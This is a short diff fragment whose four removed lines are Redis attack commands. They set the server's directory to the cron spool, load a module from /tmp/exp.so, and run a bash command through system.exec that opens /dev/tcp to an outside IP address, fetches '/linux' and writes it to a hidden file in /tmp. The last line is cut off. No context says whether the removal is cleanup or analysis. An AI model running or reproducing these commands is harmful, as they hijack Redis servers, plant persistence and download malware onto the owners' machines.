@@ -1,4 +1,0 @@
-config set dir /var/spool/cron/
-CONFIG SET dir /tmp/
-MODULE LOAD /tmp/exp.so
-system.exec "bash -c \"exec 6<>/dev/tcp/203.57.109.XXX/60114 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/YWsxIHrj2d &
